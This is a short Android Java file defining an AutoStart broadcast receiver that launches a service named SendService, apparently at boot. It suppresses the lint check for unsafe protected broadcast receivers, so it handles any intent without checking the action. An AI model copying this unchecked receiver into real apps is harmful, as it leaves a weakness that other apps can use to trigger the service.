package ucanthide.main;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class AutoStart extends BroadcastReceiver
{
    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    public void onReceive(Context context, Intent arg1)
    {
        Intent intent = new Intent(context, SendService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }
}
